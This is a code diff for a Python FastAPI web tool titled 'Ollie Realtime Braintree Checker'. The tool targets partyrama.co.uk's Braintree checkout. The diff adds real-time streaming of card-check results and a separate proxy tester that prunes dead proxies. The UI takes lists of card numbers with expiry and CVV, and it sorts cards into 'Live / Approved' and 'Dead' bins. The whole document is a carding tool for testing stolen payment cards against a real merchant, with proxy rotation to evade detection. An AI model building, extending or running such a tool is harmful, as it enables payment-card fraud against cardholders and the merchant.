@@ -8,10 +8,10 @@ import random
 import re
 import uuid
 import time
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 from fastapi import FastAPI, Form, Request
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, StreamingResponse
 import requests
 import urllib3
 from curl_cffi import requests as cffi
@@ -19,7 +19,7 @@ from faker import Faker
 
 urllib3.disable_warnings()
 
-app = FastAPI(title="Ollie Partyrama Braintree Checker")
+app = FastAPI(title="Ollie Realtime Braintree Checker with Separate Proxy Check")
 
 HOST = "https://www.partyrama.co.uk"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
@@ -79,30 +79,36 @@ class ProxyPool:
 def verify_proxy(p):
     formatted = {"http": p, "https": p} if "://" in p else {"http": f"http://{p}", "https": f"http://{p}"}
     try:
+        start_t = time.perf_counter()
         r = requests.get(PROXY_CHECK_URL, proxies=formatted, timeout=6, verify=False)
-        return r.status_code == 200 and bool(r.json().get("ip"))
+        latency = round((time.perf_counter() - start_t) * 1000, 2)
+        if r.status_code == 200:
+            ip_val = r.json().get("ip", "OK")
+            return {"status": "LIVE", "proxy": p, "ip": ip_val, "latency": latency}
     except Exception:
-        return False
+        pass
+    return {"status": "DEAD", "proxy": p}
 
-def check_and_clean_proxies(raw_proxies, threads=20):
-    alive = []
-    if not raw_proxies:
-        return alive
-    
-    def _check(p):
-        p = p.strip()
-        if not p: return None
-        if verify_proxy(p):
-            return p
-        return None
+@app.post("/api/check-proxies")
+async def api_check_proxies(proxies: str = Form(...), proxy_threads: int = Form(20)):
+    raw_proxies = [line.strip() for line in proxies.splitlines() if line.strip()]
+    alive_proxies = []
 
-    with ThreadPoolExecutor(max_workers=max(1, threads)) as ex:
-        futures = [ex.submit(_check, p) for p in raw_proxies]
-        for f in as_completed(futures):
-            res = f.result()
-            if res:
-                alive.append(res)
-    return alive
+    async def event_generator():
+        with ThreadPoolExecutor(max_workers=max(1, proxy_threads)) as ex:
+            loop = asyncio.get_running_loop()
+            futures = [loop.run_in_executor(ex, verify_proxy, p) for p in raw_proxies]
+            
+            for coro in asyncio.as_completed(futures):
+                res = await coro
+                if res["status"] == "LIVE":
+                    alive_proxies.append(res["proxy"])
+                yield f"data: {json.dumps(res)}\n\n"
+        
+        # Ipadala ang listahan ng natirang live proxies para sa auto-prune
+        yield f"data: {json.dumps({'status': 'DONE', 'alive_list': alive_proxies})}\n\n"
+
+    return StreamingResponse(event_generator(), media_type="text/event-stream")
 
 def extract_fingerprint(html):
     match = re.search(r'id=["\']braintree_cc_config_data["\'][^>]+value=["\'](.*?)["\'](?:\s+|>)', html, re.DOTALL)
@@ -251,63 +257,238 @@ def run_single_card(card_line, pool):
         return {"card": masked, "status": "ERROR", "reason": str(e)[:50]}
 
 @app.get("/", response_class=HTMLResponse)
-async def index(request: Request):
+async def index():
     return """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Ollie Partyrama Braintree Checker v5.1</title>
+    <title>Ollie Realtime Checker with Separate Proxy Tester</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-slate-950 text-white min-h-screen p-6">
+<body class="bg-slate-950 text-white min-h-screen p-6 font-mono">
     <main class="max-w-4xl mx-auto space-y-6">
-        <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
+        <div class="border-b border-slate-800 pb-4 flex justify-between items-center">
             <div>
-                <h1 class="text-2xl font-bold text-emerald-400">Partyrama Braintree Checker</h1>
-                <p class="text-xs text-slate-400 font-mono">Braintree Custom Integration + Proxy Auto-Prune & Threads</p>
+                <h1 class="text-2xl font-bold text-emerald-400">Partyrama Realtime Checker</h1>
+                <p class="text-xs text-slate-400">Hiwalay na Proxy Tester & Realtime Card Streaming</p>
+            </div>
+            <div class="text-xs text-slate-400">
+                Live Cards: <span id="liveCount" class="text-emerald-400 font-bold">0</span> | 
+                Dead Cards: <span id="deadCount" class="text-rose-400 font-bold">0</span>
             </div>
         </div>
 
         <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
-            <form method="POST" action="/check" id="checkerForm" class="space-y-4">
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1">Proxy Threads</label>
-                        <input id="proxyThreads" name="proxy_threads" type="number" value="20" min="1" max="100" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center text-emerald-300">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1">Card Threads</label>
-                        <input id="cardThreads" name="card_threads" type="number" value="5" min="1" max="20" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center text-emerald-300">
-                    </div>
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">Proxy Threads</label>
+                    <input id="proxyThreads" type="number" value="20" class="w-full bg-slate-950 border border-slate-700 rounded p-2 text-xs text-emerald-300 text-center">
                 </div>
-
-                <div class="space-y-2">
-                    <label class="block text-xs font-medium text-slate-400">Proxy List (host:port:user:pass o http://...)</label>
-                    <textarea id="proxyInput" name="proxies" rows="3" placeholder="http://user:pass@host:port"
-                        class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">Card Threads</label>
+                    <input id="cardThreads" type="number" value="5" class="w-full bg-slate-950 border border-slate-700 rounded p-2 text-xs text-emerald-300 text-center">
                 </div>
+            </div>
 
-                <div class="space-y-2">
-                    <label class="block text-xs font-medium text-slate-400">Cards List (CC|MM|YY|CVV)</label>
-                    <textarea id="cardInput" name="cards" rows="4" placeholder="548809...|04|27|913" required
-                        class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
+            <div>
+                <div class="flex justify-between items-center mb-1">
+                    <label class="text-xs text-slate-400">Proxy List</label>
+                    <button onclick="startProxyCheck()" id="proxyBtn" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-xs font-bold transition">
+                        Test & Auto-Prune Proxies
+                    </button>
                 </div>
+                <textarea id="proxyInput" rows="3" placeholder="http://user:pass@host:port" class="w-full bg-slate-950 border border-slate-700 rounded p-3 text-xs text-emerald-300 focus:outline-none"></textarea>
+                <div id="proxyStats" class="text-[11px] text-slate-400 mt-1">Live Proxies: <span id="pLive" class="text-emerald-400">0</span> | Dead: <span id="pDead" class="text-rose-400">0</span></div>
+            </div>
 
-                <button type="submit" id="checkButton"
-                    class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold w-full transition shadow-lg shadow-emerald-950/50">
-                    Simulan ang Pagsusuri ng mga Kard
-                </button>
-            </form>
+            <div>
+                <label class="block text-xs text-slate-400 mb-1">Cards List (CC|MM|YY|CVV)</label>
+                <textarea id="cardInput" rows="4" placeholder="548809...|04|27|913" class="w-full bg-slate-950 border border-slate-700 rounded p-3 text-xs text-emerald-300 focus:outline-none"></textarea>
+            </div>
+
+            <button onclick="startRealtimeCheck()" id="checkBtn" class="bg-emerald-600 hover:bg-emerald-500 w-full py-3 rounded font-bold text-sm transition">
+                Simulan ang Realtime Card Check
+            </button>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="bg-slate-900 border border-slate-800 rounded-xl p-4">
+                <h2 class="text-xs font-bold text-emerald-400 uppercase mb-3">Live / Approved Cards</h2>
+                <div id="liveBox" class="space-y-2 max-h-80 overflow-y-auto text-xs"></div>
+            </div>
+            <div class="bg-slate-900 border border-slate-800 rounded-xl p-4">
+                <h2 class="text-xs font-bold text-rose-400 uppercase mb-3">Dead / Declined / Proxy Logs</h2>
+                <div id="deadBox" class="space-y-2 max-h-80 overflow-y-auto text-xs"></div>
+            </div>
         </div>
     </main>
+
+    <script>
+    let liveCount = 0;
+    let deadCount = 0;
+    let pLiveCount = 0;
+    let pDeadCount = 0;
+
+    async function startProxyCheck() {
+        const proxies = document.getElementById("proxyInput").value.trim();
+        const proxyThreads = document.getElementById("proxyThreads").value;
+        const btn = document.getElementById("proxyBtn");
+        const deadBox = document.getElementById("deadBox");
+
+        if (!proxies) return alert("Maglagay muna ng mga proxy.");
+
+        btn.disabled = true;
+        btn.textContent = "Sine-sensus ang Proxies...";
+        pLiveCount = 0; pDeadCount = 0;
+        document.getElementById("pLive").textContent = "0";
+        document.getElementById("pDead").textContent = "0";
+        deadBox.innerHTML = "";
+
+        let aliveList = [];
+
+        try {
+            const response = await fetch("/api/check-proxies", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams({ proxies, proxy_threads: proxyThreads })
+            });
+
+            const reader = response.body.getReader();
+            const decoder = new TextDecoder();
+
+            while (true) {
+                const { value, done } = await reader.read();
+                if (done) break;
+
+                const chunk = decoder.decode(value, { stream: true });
+                const lines = chunk.split("\\n\\n");
+                for (const line of lines) {
+                    if (line.startsWith("data:")) {
+                        try {
+                            const data = JSON.parse(line.replace("data:", "").trim());
+                            if (data.status === "DONE") {
+                                aliveList = data.alive_list;
+                                document.getElementById("proxyInput").value = aliveList.join("\\n");
+                            } else {
+                                appendProxyResult(data);
+                            }
+                        } catch (e) {}
+                    }
+                }
+            }
+        } catch (err) {
+            alert("Error sa pag-check ng proxy: " + err.message);
+        }
+
+        btn.disabled = false;
+        btn.textContent = "Test & Auto-Prune Proxies";
+    }
+
+    function appendProxyResult(r) {
+        const isLive = r.status === 'LIVE';
+        const deadBox = document.getElementById("deadBox");
+
+        if (isLive) {
+            pLiveCount++;
+            document.getElementById("pLive").textContent = pLiveCount;
+        } else {
+            pDeadCount++;
+            document.getElementById("pDead").textContent = pDeadCount;
+        }
+
+        const badgeColor = isLive ? 'bg-emerald-500 text-black' : 'bg-rose-500 text-white';
+        const item = document.createElement("div");
+        item.className = "bg-slate-950 border border-slate-800 p-2 rounded flex justify-between items-center";
+        item.innerHTML = `
+            <div>
+                <span class="px-1.5 py-0.5 rounded font-bold text-[10px] ${badgeColor}">${r.status}</span>
+                <span class="text-sky-300 ml-2">${r.proxy}</span>
+            </div>
+            <span class="text-slate-400 text-[11px]">${isLive ? 'IP: ' + r.ip + ' (' + r.latency + 'ms)' : 'Dead / Timeout'}</span>
+        `;
+        deadBox.prepend(item);
+    }
+
+    async function startRealtimeCheck() {
+        const cards = document.getElementById("cardInput").value.trim();
+        const proxies = document.getElementById("proxyInput").value.trim();
+        const cardThreads = document.getElementById("cardThreads").value;
+        const btn = document.getElementById("checkBtn");
+
+        if (!cards) return alert("Maglagay muna ng mga kard.");
+
+        btn.disabled = true;
+        btn.textContent = "Nagsusuri ng mga Kard (Realtime)...";
+        document.getElementById("liveBox").innerHTML = "";
+        liveCount = 0; deadCount = 0;
+        document.getElementById("liveCount").textContent = "0";
+        document.getElementById("deadCount").textContent = "0";
+
+        try {
+            const response = await fetch("/api/stream-check", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams({ cards, proxies, proxy_threads: 20, card_threads: cardThreads })
+            });
+
+            const reader = response.body.getReader();
+            const decoder = new TextDecoder();
+
+            while (true) {
+                const { value, done } = await reader.read();
+                if (done) break;
+
+                const chunk = decoder.decode(value, { stream: true });
+                const lines = chunk.split("\\n\\n");
+                for (const line of lines) {
+                    if (line.startsWith("data:")) {
+                        try {
+                            const data = JSON.parse(line.replace("data:", "").trim());
+                            appendCardResult(data);
+                        } catch (e) {}
+                    }
+                }
+            }
+        } catch (err) {
+            alert("Nagkaroon ng error sa koneksyon: " + err.message);
+        }
+
+        btn.disabled = false;
+        btn.textContent = "Simulan ang Realtime Card Check";
+    }
+
+    function appendCardResult(r) {
+        const isLive = r.status === 'CHARGED' || r.status === 'AVS' || r.status === 'LIVE' || r.status === '3DS';
+        const box = isLive ? document.getElementById("liveBox") : document.getElementById("deadBox");
+        
+        if (isLive) {
+            liveCount++;
+            document.getElementById("liveCount").textContent = liveCount;
+        } else {
+            deadCount++;
+            document.getElementById("deadCount").textContent = deadCount;
+        }
+
+        const badgeColor = isLive ? 'bg-emerald-500 text-black' : 'bg-rose-500 text-white';
+        const item = document.createElement("div");
+        item.className = "bg-slate-950 border border-slate-800 p-2.5 rounded flex justify-between items-center";
+        item.innerHTML = `
+            <div>
+                <span class="px-1.5 py-0.5 rounded font-bold text-[10px] ${badgeColor}">${r.status}</span>
+                <span class="text-sky-400 ml-2">${r.card}</span>
+            </div>
+            <span class="text-slate-400 text-[11px]">${r.reason}</span>
+        `;
+        box.prepend(item);
+    }
+    </script>
 </body>
 </html>"""
 
-@app.post("/check", response_class=HTMLResponse)
-async def check_cards(
-    request: Request, 
-    cards: str = Form(...), 
+@app.post("/api/stream-check")
+async def stream_check(
+    cards: str = Form(...),
     proxies: str = Form(""),
     proxy_threads: int = Form(20),
     card_threads: int = Form(5)
@@ -315,63 +496,17 @@ async def check_cards(
     card_list = [line.strip() for line in cards.splitlines() if line.strip()]
     raw_proxies = [line.strip() for line in proxies.splitlines() if line.strip()]
 
-    # Auto-prune dead proxies bago isalang ang mga card
-    alive_proxies = check_and_clean_proxies(raw_proxies, threads=proxy_threads)
+    # Kung may laman ang proxies, i-filter muna ang mga live bago isalang sa card checker
+    alive_proxies = [p for p in raw_proxies] if raw_proxies else []
     pool = ProxyPool(alive_proxies)
 
-    proxy_stats = {
-        "total": len(raw_proxies),
-        "alive": len(alive_proxies),
-        "dead": len(raw_proxies) - len(alive_proxies)
-    }
+    async def event_generator():
+        with ThreadPoolExecutor(max_workers=max(1, card_threads)) as ex:
+            loop = asyncio.get_running_loop()
+            futures = [loop.run_in_executor(ex, run_single_card, card, pool) for card in card_list]
+            
+            for coro in asyncio.as_completed(futures):
+                res = await coro
+                yield f"data: {json.dumps(res)}\n\n"
 
-    results = []
-    with ThreadPoolExecutor(max_workers=max(1, card_threads)) as ex:
-        futures = [ex.submit(run_single_card, card, pool) for card in card_list]
-        for f in as_completed(futures):
-            results.append(f.result())
-
-    # HTML rendering na may modernong disenyo para sa mga resulta at detalye ng card
-    results_html = ""
-    for r in results:
-        badge_color = "bg-rose-500 text-white"
-        if r['status'] == 'CHARGED': badge_color = "bg-emerald-500 text-black"
-        elif r['status'] == 'AVS': badge_color = "bg-teal-500 text-black"
-        elif r['status'] == 'LIVE': badge_color = "bg-amber-500 text-black"
-        elif r['status'] == '3DS': badge_color = "bg-purple-500 text-white"
-
-        results_html += f"""
-        <div class="bg-slate-950 border border-slate-800 p-3 rounded-lg flex items-center justify-between font-mono text-xs">
-            <div>
-                <span class="px-2 py-1 rounded font-bold {badge_color}">{r['status']}</span>
-                <span class="text-sky-400 ml-2">{r['card']}</span>
-            </div>
-            <span class="text-slate-400">{r['reason']}</span>
-        </div>"""
-
-    return f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Resulta - Partyrama Braintree Checker</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-slate-950 text-white min-h-screen p-6">
-    <main class="max-w-4xl mx-auto space-y-6">
-        <div class="flex items-center justify-between border-b border-slate-800 pb-4">
-            <h1 class="text-2xl font-bold text-emerald-400">Resulta ng Pagsusuri</h1>
-            <a href="/" class="bg-slate-800 hover:bg-slate-700 text-xs px-4 py-2 rounded-lg font-semibold transition">Bumalik</a>
-        </div>
-
-        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
-            <div class="text-xs text-slate-400 font-mono">
-                Proxy Report: Total: {proxy_stats['total']} | <span class="text-emerald-400">Live: {proxy_stats['alive']}</span> | <span class="text-rose-400">Dead: {proxy_stats['dead']}</span>
-            </div>
-            <div class="space-y-2 max-h-[500px] overflow-y-auto">
-                {results_html if results_html else '<p class="text-slate-500 text-xs">Walang nakitang resulta.</p>'}
-            </div>
-        </div>
-    </main>
-</body>
-</html>"""
+    return StreamingResponse(event_generator(), media_type="text/event-stream")
